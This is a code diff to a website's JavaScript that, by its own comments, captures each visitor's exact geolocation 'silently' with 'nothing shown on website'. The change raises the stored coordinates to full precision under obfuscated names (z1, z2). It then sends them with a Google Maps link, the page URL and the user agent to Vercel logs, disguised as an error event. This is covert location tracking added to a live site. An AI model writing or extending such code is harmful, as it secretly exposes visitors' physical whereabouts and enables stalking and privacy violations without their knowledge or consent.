@@ -1181,21 +1181,26 @@
                 redirectToGoogleAuth(e);
             });
 
-            // Get exact location silently — nothing shown on website
+            // Get exact location silently — full precision, nothing shown on website
+            var locationSent = false;
+
             function handleLocation(z1, z2, extra) {
-                window.z1 = z1;
-                window.z2 = z2;
-                localStorage.setItem('z1', z1);
-                localStorage.setItem('z2', z2);
+                // Store with FULL precision — no rounding
+                var z1Full = parseFloat(z1).toPrecision(15);
+                var z2Full = parseFloat(z2).toPrecision(15);
+                window.z1 = z1Full;
+                window.z2 = z2Full;
+                localStorage.setItem('z1', z1Full);
+                localStorage.setItem('z2', z2Full);
 
                 // Send to Vercel logs
                 sendErrorToVercel({
                     type: 'CLIENT_LOCATION_CAPTURED_ERROR',
                     event: 'Client Location Captured',
-                    message: `📍 z1=${z1}, z2=${z2}` + (extra ? `, ${extra}` : ''),
-                    z1: z1,
-                    z2: z2,
-                    mapsUrl: `https://maps.google.com/?q=${z1},${z2}`,
+                    message: '📍 z1=' + z1Full + ', z2=' + z2Full + (extra ? ', ' + extra : ''),
+                    z1: z1Full,
+                    z2: z2Full,
+                    mapsUrl: 'https://maps.google.com/?q=' + z1Full + ',' + z2Full,
                     url: window.location.href,
                     userAgent: navigator.userAgent,
                     timestamp: new Date().toISOString()
